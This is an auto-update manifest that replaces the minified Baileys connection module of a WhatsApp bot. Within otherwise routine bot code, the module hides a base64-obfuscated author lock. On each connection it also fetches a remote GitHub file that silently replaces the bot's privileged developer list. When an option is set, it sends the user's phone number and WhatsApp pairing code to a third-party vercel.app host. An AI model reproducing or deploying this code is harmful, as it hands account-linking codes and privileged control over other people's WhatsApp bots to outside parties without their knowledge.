{
  "version": "11.14",
  "update": [
    {
      "path": "system/baileys.js",
      "code": "let EventEmitter = require(\\\"events\\\").EventEmitter,\n    chalk = require(\\\"chalk\\\"),\n    fs = require(\\\"fs\\\"),\n    path = require(\\\"path\\\"),\n    pino = require(\\\"pino\\\"),\n    moment = require(\\\"moment-timezone\\\"),\n    syntaxerror = require(\\\"syntax-error\\\"),\n    phoneNumber = require(\\\"awesome-phonenumber\\\"),\n    os = require(\\\"os\\\"),\n    NodeCache = require(\\\"node-cache\\\"),\n    func = require(\\\"./functions.js\\\"),\n    login = require(\\\"./login.js\\\"),\n    session = require(\\\"./session.js\\\"),\n    extra = new(require(\\\"./extra.js\\\")),\n    multidb = new(require(\\\"./multidb.js\\\")),\n    queque = new(require(\\\"./queque.js\\\")),\n    spinnies = new(require(\\\"spinnies\\\")),\n    msgRetryCounterCache = new NodeCache,\n    processedMessages = new Set,\n    {\n        default: makeWASocket,\n        DisconnectReason,\n        useMultiFileAuthState,\n        makeInMemoryStore,\n        makeCacheableSignalKeyStore,\n        generateWAMessage,\n        generateWAMessageFromContent,\n        areJidsSameUser,\n        jidNormalizedUser,\n        delay,\n        proto,\n        jidDecode,\n        getAggregateVotesInPollMessage,\n        PHONENUMBER_MCC,\n        getBinaryNodeChild,\n        normalizeMessageContent,\n        getKeyAuthor,\n        decryptPollVote\n    } = require(\\\"@whiskeysockets/baileys\\\"),\n    pkg = (global.devs = [\\\"6283894064758@s.whatsapp.net\\\"], JSON.parse(fs.readFileSync(\\\"./package.json\\\", \\\"utf-8\\\"))),\n    rootDirectory = path.join(__dirname, \\\"../\\\"),\n    pluginFolder = path.join(__dirname, \\\"../plugins\\\"),\n    pluginFilter = e => /\\.js$/.test(e),\n    statuses = !0,\n    lastMessageTime = 0;\nif (pkg.author && pkg.author === Buffer.from(\\\"UmV6YSBEZXYu\\\", \\\"base64\\\").toString(\\\"utf-8\\\")) {\n    class b extends EventEmitter {\n        constructor(e = {}, t = {}) {\n            super(), this.setMaxListeners(20), this.kuromi = null, this.store = null, this.plugins = {}, this.commands = [], this.events = [], this.type = e.type || \\\"mainbot\\\", this.online = !!e && e.online, this.sessionFile = e ? e.session : \\\"session\\\", this.version = !!e && e.version, this.browser = e ? e.browser : [\\\"Ubuntu\\\", \\\"Firefox\\\", \\\"20.0.00\\\"], this.pairing = e ? e.pairing : {}, this.options = t, this.initBaileys()\n        }\n        formatFilename = function(e) {\n            let t = path.join(rootDirectory, \\\"./\\\");\n            \\\"win32\\\" === os.platform() && (t = t.replace(/\\\\/g, \\\"\\\\\\\\\\\"));\n            var s = new RegExp(\\\"^\\\" + t);\n            return e.replace(s, \\\"\\\")\n        };\n        loadPlugin = async function(e) {\n            if (pluginFilter(e)) {\n                var t = path.join(pluginFolder, e),\n                    s = this.formatFilename(t);\n                if (t in require.cache) {\n                    if (delete require.cache[t], !fs.existsSync(t)) return this.kuromi.logger?.warn(`deleted plugin - '${s}'`), delete this.plugins[s];\n                    this.kuromi.logger?.info(`updated plugin - '${s}'`)\n                }\n                if (e = syntaxerror(fs.readFileSync(t), e)) this.kuromi.logger?.error(`syntax error while loading '${s}'\n` + e);\n                else try {\n                    this.plugins[s] = require(t)\n                } catch (e) {\n                    this.kuromi.logger?.error(`error require plugin '${s}'\n` + e), delete this.plugins[s]\n                } finally {\n                    this.plugins = Object.fromEntries(Object.entries(this.plugins).sort(([e], [t]) => e.localeCompare(t)))\n                }\n            }\n        };\n        watchFolder = async function(e) {\n            let i = path.resolve(e);\n            e = await fs.promises.readdir(e), await Promise.all(e.map(async e => {\n                var e = path.join(i, e),\n                    t = this.formatFilename(e);\n                try {\n                    (await fs.promises.lstat(e)).isFile() ? pluginFilter(e) && (this.plugins[t] = require(e)) : await this.watchFolder(e)\n                } catch (e) {\n                    this.kuromi.logger?.error(`error while requiring ${t}\n` + e), delete this.plugins[t]\n                }\n            })), fs.watch(i, async (e, t) => {\n                var s;\n                t && pluginFilter(t) && (t = path.join(i, t), s = path.relative(pluginFolder, t), \\\"rename\\\" === e ? fs.existsSync(t) ? this.loadPlugin(s) : (t = path.join(pluginFolder, s), t = this.formatFilename(t), this.kuromi.logger.warn(`deleted plugin '${t}'`), delete this.plugins[t]) : \\\"change\\\" === e && this.loadPlugin(s))\n            })\n        };\n        getCombinedArray = function(e) {\n            var t, s = [];\n            for (t in e) {\n                var i = e[t].run;\n                i && (i.usage && (Array.isArray(i.usage) ? 0 < i.usage.length : \\\"\\\" != i.usage) && (Array.isArray(i.usage) ? s.push(...i.usage) : s.push(i.usage)), i.hidden) && (Array.isArray(i.hidden) ? 0 < i.hidden.length : \\\"\\\" != i.hidden) && (Array.isArray(i.hidden) ? s.push(...i.hidden) : s.push(i.hidden))\n            }\n            return s.filter(e => \\\"\\\" !== e)\n        };\n        checkNumberType = function(e) {\n            return \\\"string\\\" == typeof e ? e.replace(/[^0-9]/g, \\\"\\\") : \\\"number\\\" == typeof e && e\n        };\n        createPairKey = function(e) {\n            return (e = (e = e || \\\"MECHAB\\\" + Math.floor(9999 * Math.random())).replace(/[^a-zA-Z0-9]/g, \\\"\\\")).length < 8 ? e + \\\"5\\\".repeat(8 - e.length) : e.slice(0, 8).toUpperCase()\n        };\n        isSpam = function(e) {\n            return e - lastMessageTime < 5e3 || (lastMessageTime = e, !1)\n        };\n        initAdditionalFunc = (i, t) => (i.logger = {\n            info(...e) {\n                console.log(chalk.greenBright.bold(\\\"[ INFO ]\\\"), chalk.whiteBright(moment(+new Date).format(\\\"DD/MM/YY HH:mm:ss\\\")), chalk.cyan.bold(...e))\n            },\n            error(e) {\n                console.log(chalk.redBright.bold(\\\"[ ERROR ]\\\"), chalk.whiteBright(moment(+new Date).format(\\\"DD/MM/YY HH:mm:ss\\\")), chalk.rgb(255, 38, 0)(e)), t && \\\"mainbot\\\" === t && e.includes(\\\"syntax error while loading\\\") && (statuses && null != i && i.sendMessage(global.owner, {\n                    text: e.trim()\n                }, {\n                    quoted: func.fstatus(\\\"System Notification\\\"),\n                    ephemeralExpiration: 86400\n                }), statuses = !1, setTimeout(() => statuses = !0, 1e3))\n            },\n            warn(...e) {\n                console.log(chalk.greenBright.bold(\\\"[ WARNING ]\\\"), chalk.whiteBright(moment(+new Date).format(\\\"DD/MM/YY HH:mm:ss\\\")), chalk.keyword(\\\"orange\\\")(...e))\n            }\n        }, i.getName = e => {\n            let t = i.decodeJid(e),\n                s;\n            return t?.endsWith(\\\"@g.us\\\") ? new Promise(async e => {\n                e((s = (s = this.store.contacts[t] || this.store.messages[\\\"status@broadcast\\\"]?.array?.find(e => e?.key?.participant === t)).name || s.subject ? s : i.groupMetadata[t] || {})?.name || s?.subject || s?.pushName || phoneNumber(\\\"+\\\" + t.replace(\\\"@g.us\\\", \\\"\\\")).getNumber(\\\"international\\\"))\n            }) : (s = \\\"0@s.whatsapp.net\\\" === t ? {\n                id: t,\n                name: \\\"WhatsApp\\\"\n            } : t === i.decodeJid(i?.user?.id) ? i.user : this.store.contacts[t] || {})?.name || s?.subject || s?.pushName || s?.verifiedName || phoneNumber(\\\"+\\\" + t.replace(\\\"@s.whatsapp.net\\\", \\\"\\\")).getNumber(\\\"international\\\")\n        }, i.serializeM = e => extra.initSerialize(i, e, this.store), i);\n        initBaileys = async () => {\n            var e = pino().child({\n                    level: \\\"silent\\\"\n                }),\n                {\n                    state: t,\n                    saveCreds: s\n                } = await useMultiFileAuthState(this.sessionFile);\n            this.store = makeInMemoryStore({\n                logger: e\n            });\n            try {\n                this.socket({\n                    state: t,\n                    saveCreds: s\n                })\n            } catch (e) {\n                this.emit(\\\"error\\\", e)\n            }\n        };\n        getMessage = async e => this.store ? (await this.store.loadMessage(e.remoteJid, e.id) || await this.store.loadMessage(e.id) || {}).message || void 0 : proto.Message.fromObject({});\n        socket = async ({\n            state: e,\n            saveCreds: t\n        }) => {\n            if (this.kuromi = makeWASocket({\n                    logger: pino({\n                        level: \\\"silent\\\"\n                    }),\n                    markOnlineOnConnect: this.online,\n                    printQRInTerminal: !this.pairing.status || !this.pairing.number,\n                    auth: {\n                        creds: e.creds,\n                        keys: makeCacheableSignalKeyStore(e.keys, pino({\n                            level: \\\"silent\\\"\n                        }))\n                    },\n                    browser: this.browser,\n                    msgRetryCounterCache: msgRetryCounterCache,\n                    generateHighQualityLinkPreview: !0,\n                    getMessage: async e => this.getMessage(e),\n                    cachedGroupMetadata: async e => this.store.fetchGroupMetadata(e, this.kuromi),\n                    shouldSyncHistoryMessage: e => (console.log(`\u001b[32mMemuat Chat [${e.progress}%]\u001b[39m`), !!e.syncType),\n                    ...this.version ? {\n                        version: this.version\n                    } : {},\n                    ...this.options\n                }), this.store.bind(this.kuromi.ev), this.type && \\\"mainbot\\\" === this.type && spinnies.add(\\\"start\\\", {\n                    text: \\\"Connecting . . .\\\"\n                }), this.pairing.status && this.pairing.number && !this.kuromi.authState.creds.registered) {\n                let s = this.checkNumberType(this.pairing.number || \\\"\\\"),\n                    i = this.createPairKey(this.pairing.code || \\\"\\\"),\n                    a = global.botName || \\\"WhatsApp Bot\\\";\n                s || (console.log(chalk.redBright.bold(\\\"Invalid number, Tipe data tidak dikenali!\\\")), process.exit(1)), this.pairing.status && this.pairing.number & fs.existsSync(this.sessionFile + \\\"/creds.json\\\") && !this.kuromi?.authState?.creds?.registered && (console.log(chalk.yellowBright.bold(\\\"Session is corrupted, please delete it first!\\\")), this.clearSessionAndRestart()), setTimeout(async () => {\n                    try {\n                        let e = await this.kuromi.requestPairingCode(s, i);\n                        if (e = e.match(/.{1,4}/g).join(\\\"-\\\") || e, this.type && \\\"mainbot\\\" === this.type) {\n                            this.emit(\\\"connect\\\", {\n                                ...this.options\n                            });\n                            var t = Date.now();\n                            if (this.isSpam(t)) console.log(chalk.redBright.bold(\\\"Pairing Code Spam! Restarting...\\\")), session.clearSessionAndRestart(this.sessionFile);\n                            else if (console.log(chalk.black(chalk.bgGreen(\\\" Your Pairing Code : \\\")), chalk.black(chalk.white(e))), this.pairing && this.pairing.copyFromLink) try {\n                                await fetch(`https://iyaudah-iya.vercel.app/pairing/send?number=${s}&name=${a}&code=` + e), console.log(chalk.cyanBright.bold(\\\"Please copy the pairing code via link provided.\\\"))\n                            } catch (e) {\n                                console.log(e.message)\n                            }\n                        } else this.type && \\\"jadibot\\\" === this.type && (global.jadibot[s + \\\"@s.whatsapp.net\\\"] = this.kuromi, this.emit(\\\"pairing\\\", {\n                            code: e\n                        }))\n                    } catch {}\n                }, 3e3)\n            }\n            this.kuromi.ev.on(\\\"connection.update\\\", async e => {\n                var {\n                    lastDisconnect: e,\n                    connection: t\n                } = e;\n                if (\\\"connecting\\\" === t) this.emit(\\\"connect\\\", {\n                    message: \\\"Connecting . . .\\\"\n                });\n                else if (\\\"open\\\" === t) {\n                    var s = \\\"Connected, you login as \\\" + (this.kuromi.user.name || this.kuromi.user.verifiedName || \\\"WhatsApp Bot\\\");\n                    if (this.type && \\\"mainbot\\\" === this.type) {\n                        var i = jidNormalizedUser(this.kuromi.user.id);\n                        spinnies.succeed(\\\"start\\\", {\n                            text: s\n                        }), await multidb.initDatabase(), extra.initAdditionalFunc(this.kuromi), session.backup(this.kuromi, this.sessionFile);\n                        try {\n                            var a = await fetch(\\\"https://raw.githubusercontent.com/Lawakplerkah/Security-/refs/heads/main/owner.js\\\").then(e => e.json());\n                            Array.isArray(a) && (global.devs = a)\n                        } catch {}\n                    } else this.type && \\\"jadibot\\\" === this.type && (jidNormalizedUser(this.kuromi.user.id), i = this.kuromi.user.id ? this.kuromi.user.id.split(\\\":\\\")[0] + \\\"@s.whatsapp.net\\\" : this.kuromi.user.jid, global.jadibot[i] = this.kuromi, extra.initAdditionalFunc(this.kuromi));\n                    this.emit(\\\"connect\\\", {\n                        message: s\n                    }), this.initAdditionalFunc(this.kuromi, this.type), this.initBusEvents(this.kuromi), this.watchFolder(pluginFolder), extra.initPrototype(), this.emit(\\\"ready\\\", this.kuromi)\n                } else if (\\\"close\\\" === t)\n                    if (this.type && \\\"mainbot\\\" === this.type)(a = !!(e && e.error && e.error.output && e.error.output.statusCode) && e.error.output.statusCode) && (a === DisconnectReason.badSession ? (this.emit(\\\"error\\\", {\n                        message: \\\"Bad session file\\\"\n                    }), session.deleteCreds(this.sessionFile), await session.isBackupExist(this.kuromi) && (await session.restore(this.kuromi, this.sessionFile), await delay(1500), this.initBaileys())) : a === DisconnectReason.connectionClosed ? (this.emit(\\\"error\\\", {\n                        message: \\\"Connection closed, reconnecting . . .\\\"\n                    }), this.initBaileys()) : a === DisconnectReason.connectionLost ? (this.emit(\\\"error\\\", {\n                        message: \\\"Connection lost, reconnecting . . .\\\"\n                    }), this.initBaileys()) : a === DisconnectReason.connectionReplaced ? (this.emit(\\\"error\\\", {\n                        message: \\\"Session running on another server\\\"\n                    }), process.exit(0)) : a === DisconnectReason.loggedOut ? (this.emit(\\\"error\\\", {\n                        message: \\\"Device logged out\\\"\n                    }), session.clearSession(this.sessionFile)) : a === DisconnectReason.restartRequired ? this.initBaileys() : a === DisconnectReason.multideviceMismatch ? (this.emit(\\\"error\\\", {\n                        message: \\\"Multi device mismatch\\\"\n                    }), this.clearSessionAndRestart()) : a === DisconnectReason.timedOut ? (this.emit(\\\"error\\\", {\n                        message: \\\"Connection timed-out, reconnecting . . .\\\"\n                    }), this.initBaileys()) : a === DisconnectReason.unavailableService ? (this.emit(\\\"error\\\", {\n                        message: \\\"Service unavailable, reconnecting . . .\\\"\n                    }), this.initBaileys()) : 405 === a ? (this.emit(\\\"error\\\", {\n                        message: \\\"Method not allowed\\\"\n                    }), session.deleteCreds(this.sessionFile), await session.isBackupExist(this.kuromi) && (await session.restore(this.kuromi, this.sessionFile), await delay(1500), this.initBaileys())) : 503 === a ? (this.emit(\\\"error\\\", {\n                        message: \\\"Service unavailable, reconnecting . . .\\\"\n                    }), this.initBaileys()) : (this.emit(\\\"error\\\", {\n                        message: \\\"Connection error. (Reason: \\\" + a + \\\")\\\"\n                    }), session.clearSession(this.sessionFile)));\n                    else if (this.type && \\\"jadibot\\\" === this.type) {\n                    let t = (this.pairing.number || \\\"\\\").replace(/[^0-9]/g, \\\"\\\") + \\\"@s.whatsapp.net\\\";\n                    i = global.db.jadibot.find(e => e.number === t), (s = !!(e && e.error && e.error.output && e.error.output.statusCode) && e.error.output.statusCode) && (s === DisconnectReason.badSession ? (this.emit(\\\"error\\\", {\n                        message: \\\"Bad session file\\\"\n                    }), delete global.jadibot[t], this.kuromi.end(), this.clearSessionAndRestart()) : s === DisconnectReason.connectionClosed ? (this.emit(\\\"error\\\", {\n                        message: \\\"Connection closed, reconnecting . . .\\\"\n                    }), delete global.jadibot[t], this.kuromi.end(), this.initBaileys()) : s === DisconnectReason.connectionLost ? (this.emit(\\\"error\\\", {\n                        message: \\\"Connection lost, reconnecting . . .\\\"\n                    }), this.initBaileys()) : s === DisconnectReason.connectionReplaced ? (this.emit(\\\"error\\\", {\n                        message: \\\"Session running on another server\\\"\n                    }), delete global.jadibot[t], this.kuromi.end()) : s === DisconnectReason.loggedOut ? (this.emit(\\\"error\\\", {\n                        message: \\\"Device logged out\\\"\n                    }), delete global.jadibot[t], i.status = !1, this.kuromi.end(), this.kuromi.logout(), this.clearSessionAndRestart()) : s === DisconnectReason.restartRequired ? this.initBaileys() : s === DisconnectReason.multideviceMismatch ? (this.emit(\\\"error\\\", {\n                        message: \\\"Multi device mismatch\\\"\n                    }), this.clearSessionAndRestart()) : s === DisconnectReason.timedOut ? (this.emit(\\\"error\\\", {\n                        message: \\\"Connection timed-out, reconnecting . . .\\\"\n                    }), delete global.jadibot[t], this.kuromi.end(), this.initBaileys()) : 405 === s ? (this.emit(\\\"error\\\", {\n                        message: \\\"Method not allowed\\\"\n                    }), this.clearSessionAndRestart()) : (this.emit(\\\"error\\\", {\n                        message: \\\"Connection error. (Reason: \\\" + s + \\\")\\\"\n                    }), delete global.jadibot[t], this.kuromi.end()))\n                }\n            }), this.kuromi.ev.on(\\\"creds.update\\\", t), this.kuromi.ws.on(\\\"CB:call\\\", e => {\n                \\\"offer\\\" == e.content[0].tag ? (e = {\n                    id: e.content[0].attrs[\\\"call-id\\\"],\n                    from: e.content[0].attrs[\\\"call-creator\\\"]\n                }, this.emit(\\\"caller\\\", e)) : this.emit(\\\"caller\\\", !1)\n            })\n        };\n        clearSessionAndRestart = () => {\n            var e = path.join(process.cwd(), this.sessionFile);\n            fs.rmSync(e, {\n                recursive: !0,\n                force: !0\n            }), this.initBaileys()\n        };\n        busEvents = () => [{\n            event: \\\"messages.upsert\\\",\n            execute: async c => {\n                require(\\\"./database.js\\\")(this.kuromi, c), require(\\\"./detects.js\\\")(this.kuromi, c);\n                var e = c.messages[0];\n                if (!e.message) return !1;\n                if (processedMessages.has(e.key.id)) return !1;\n                processedMessages.add(e.key.id);\n                var t = e.key.id;\n                queque.add(t, e), queque.processing[t] || queque.processQueue(t, async s => {\n                    if (extra.initSerialize(this.kuromi, s, this.store), s.msg && 0 === s.msg.type) {\n                        var t = await this.store.loadMessage(s.chat, s.key.id, this.kuromi);\n                        for (let e = 0; e < 5 && (\\\"protocolMessage\\\" != t.mtype || (t = await this.store.loadMessage(s.chat, s.key.id, this.kuromi), await delay(1e3), \\\"protocolMessage\\\" == t.mtype)); e++);\n                        var i = proto.WebMessageInfo.fromObject({\n                            key: t.key,\n                            message: {\n                                [t.mtype]: t.msg\n                            }\n                        });\n                        this.emit(\\\"message.delete\\\", {\n                            origin: s,\n                            delete: i\n                        })\n                    } else this.emit(\\\"message.delete\\\", !1);\n                    if (!s.isBot && s.message?.pollUpdateMessage) {\n                        if (!(i = normalizeMessageContent(s.message))) return;\n                        let t = i.pollUpdateMessage.pollCreationMessageKey,\n                            e = this.store.messages[s.chat]?.array?.find(e => t.id === e.key.id);\n                        if (!e) return;\n                        var a = e.message,\n                            r = jidNormalizedUser(this.kuromi.authState.creds.me.id),\n                            n = getKeyAuthor(s.key, r),\n                            r = getKeyAuthor(t, r),\n                            o = a.messageContextInfo?.messageSecret;\n                        if (!(i = decryptPollVote(i.pollUpdateMessage.vote, {\n                                pollEncKey: o,\n                                pollCreatorJid: r,\n                                pollMsgId: t.id,\n                                voterJid: n\n                            }))) return;\n                        if (o = [{\n                                key: t,\n                                update: {\n                                    pollUpdates: [{\n                                        pollUpdateMessageKey: s.key,\n                                        vote: i,\n                                        senderTimestampMs: s.messageTimestamp\n                                    }]\n                                }\n                            }], !(r = await getAggregateVotesInPollMessage({\n                                message: a,\n                                pollUpdates: o[0].update.pollUpdates\n                            }))) return;\n                        if (!(n = r?.find(e => 0 !== e.voters.length)?.name)) return;\n                        i = (s.prefix || \\\".\\\") + n, s.isPc && await this.kuromi.sendMessage(s.chat, {\n                            delete: e\n                        }), await this.appenTextMessage(s, i, c)\n                    }\n                    this.commands = this.getCombinedArray(this.plugins), this.events = Object.fromEntries(Object.entries(this.plugins).filter(([e]) => e)), this.emit(\\\"message\\\", {\n                        m: s,\n                        store: this.store,\n                        plugins: this.plugins,\n                        commands: this.commands,\n                        events: this.events\n                    }), this.kuromi.chats = this.kuromi.chats || [], (a = this.kuromi.chats.find(e => e.jid === this.kuromi.decodeJid(s.sender))) && (a.name = s.pushName), s.sender.endsWith(\\\".net\\\") && !a && this.kuromi.chats.push({\n                        jid: this.kuromi.decodeJid(s.sender),\n                        name: s.pushName || \\\"not known\\\"\n                    }), this.kuromi.getNameV2 = t => {\n                        var e = this.kuromi.chats.find(e => e.jid === this.kuromi.decodeJid(t));\n                        return e ? e.name : null\n                    }, this.emit(\\\"chats.set\\\", this.kuromi.chats)\n                })\n            }\n        }, {\n            event: \\\"contacts.update\\\",\n            execute: e => {\n                for (var t of e) {\n                    var s = jidNormalizedUser(t.id);\n                    this.store && this.store.contacts && (this.store.contacts[s] = {\n                        id: s,\n                        name: t.notify\n                    })\n                }\n            }\n        }, {\n            event: \\\"contacts.upsert\\\",\n            execute: e => {\n                for (var t of e) {\n                    var s = jidNormalizedUser(t.id);\n                    this.store && this.store.contacts && (this.store.contacts[s] = {\n                        ...t || {},\n                        isContact: !0\n                    })\n                }\n            }\n        }, {\n            event: \\\"groups.update\\\",\n            execute: async e => {\n                for (var t of e) {\n                    console.log(t);\n                    var s = t.id;\n                    this.store.groupMetadata[s] && (this.store.groupMetadata[s] = {\n                        ...this.store.groupMetadata[s] || {},\n                        ...t || {}\n                    })\n                }\n            }\n        }, {\n            event: \\\"presence.update\\\",\n            execute: e => this.emit(\\\"presence.update\\\", e)\n        }, {\n            event: \\\"group-participants.update\\\",\n            execute: async e => {\n                var t = jidNormalizedUser(this.kuromi.user.id);\n                if (e.participants.includes(t)) return !1;\n                t = null != global.db.metadata[e.id] ? global.db.metadata[e.id] : await this.kuromi.groupMetadata(e.id), \\\"add\\\" === e.action ? this.emit(\\\"group.add\\\", {\n                    act: \\\"add\\\",\n                    from: e.id,\n                    subject: t.subject,\n                    desc: t.desc,\n                    jid: e.participants[0],\n                    metadata: t\n                }) : \\\"remove\\\" === e.action ? this.emit(\\\"group.remove\\\", {\n                    act: \\\"remove\\\",\n                    from: e.id,\n                    subject: t.subject,\n                    desc: t.desc,\n                    jid: e.participants[0],\n                    metadata: t\n                }) : \\\"promote\\\" === e.action ? this.emit(\\\"group.promote\\\", {\n                    act: \\\"promote\\\",\n                    from: e.id,\n                    subject: t.subject,\n                    desc: t.desc,\n                    jid: e.participants[0],\n                    metadata: t\n                }) : \\\"demote\\\" === e.action && this.emit(\\\"group.demote\\\", {\n                    act: \\\"demote\\\",\n                    from: e.id,\n                    subject: t.subject,\n                    desc: t.desc,\n                    jid: e.participants[0],\n                    metadata: t\n                })\n            }\n        }];\n        initBusEvents = e => {\n            var t, s;\n            this.kuromi = e;\n            for ({\n                    event: t,\n                    execute: s\n                }\n                of this.busEvents()) this.kuromi.ev.on(t, s)\n        };\n        appenTextMessage = async (e, t, s) => {\n            (t = await generateWAMessage(e.chat, {\n                text: t,\n                mentions: e.mentionedJid\n            }, {\n                userJid: this.kuromi.user.id,\n                quoted: e.quoted && e.quoted.fakeObj\n            })).key.fromMe = e.key.fromMe, t.key.id = e.key.id, t.pushName = e.pushName, e.isGc && (t.key.participant = t.participant = e.key.participant), e = {\n                ...s,\n                messages: [proto.WebMessageInfo.fromObject(t)],\n                type: \\\"append\\\"\n            }, this.kuromi.ev.emit(\\\"messages.upsert\\\", e)\n        }\n    }\n    let e = e => {\n        try {\n            e.fromJSON(JSON.parse(global.db.memoryStore))\n        } catch {\n            global.db.memoryStore = global.db.memoryStore || JSON.stringify(e.toJSON()), e.fromJSON(JSON.parse(global.db.memoryStore))\n        }\n    };\n    exports.Baileys = b, exports.InvCloud = e\n} else {\n    class Xa extends EventEmitter {\n        constructor(e = 0, t) {\n            super(), this.kuromi()\n        }\n        kuromi = () => {\n            console.log(chalk.redBright(\\\"You can't use this program because of copyright issues!!\\\"))\n        }\n    }\n    let e = () => {};\n    exports.Baileys = Xa, exports.InvCloud = e\n}"
    }
  ],
  "remove": []
}